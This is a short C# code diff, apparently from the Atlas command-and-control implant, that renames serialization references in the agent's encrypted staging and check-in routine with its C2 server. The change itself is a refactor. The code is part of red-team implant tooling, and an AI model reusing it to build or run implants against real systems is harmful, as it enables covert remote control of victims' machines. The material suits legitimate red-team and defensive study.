@@ -26,7 +26,7 @@ namespace Atlas
 
                 };
                 Config.SessionId = GetStage.session_id;
-                string SerializedData = Crypto.EncryptStage(Utils.GetStage.ToJson(GetStage));
+                string SerializedData = Crypto.EncryptStage(Messages.GetStage.ToJson(GetStage));
                 var result = Get(SerializedData);
                 string final_result = Crypto.Decrypt(result);
                 Messages.StageResponse StageResponse = Messages.StageResponse.FromJson(final_result);
@@ -46,18 +46,18 @@ namespace Atlas
                     architecture = Utils.GetArch()
                 };
 #if DEFAULT
-                string FinalSerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.PayloadUUID + Utils.CheckIn.ToJson(CheckIn)));
+                string FinalSerializedData = Convert.ToBase64String(Encoding.UTF8.GetBytes(Config.PayloadUUID + Messages.CheckIn.ToJson(CheckIn)));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
-                string FinalSerializedData = Crypto.EncryptCheckin(Utils.CheckIn.ToJson(CheckIn));
+                string FinalSerializedData = Crypto.EncryptCheckin(Messages.CheckIn.ToJson(CheckIn));
 #endif
                 var new_result = Get(FinalSerializedData);
 #if (DEFAULT_PSK || DEFAULT_EKE)
                 string last_result = Crypto.Decrypt(new_result);
 #endif
 #if DEFAULT
-                Messages.CheckInResponse CheckInResponse = Utils.CheckInResponse.FromJson(Encoding.UTF8.GetString(Convert.FromBase64String(new_result)).Substring(36));
+                Messages.CheckInResponse CheckInResponse = Messages.CheckInResponse.FromJson(Encoding.UTF8.GetString(Convert.FromBase64String(new_result)).Substring(36));
 #elif (DEFAULT_PSK || DEFAULT_EKE)
-                Messages.CheckInResponse CheckInResponse = Utils.CheckInResponse.FromJson(last_result);
+                Messages.CheckInResponse CheckInResponse = Messages.CheckInResponse.FromJson(last_result);
 #endif
                 Config.UUID = CheckInResponse.id;
                 if (CheckInResponse.status == "success")
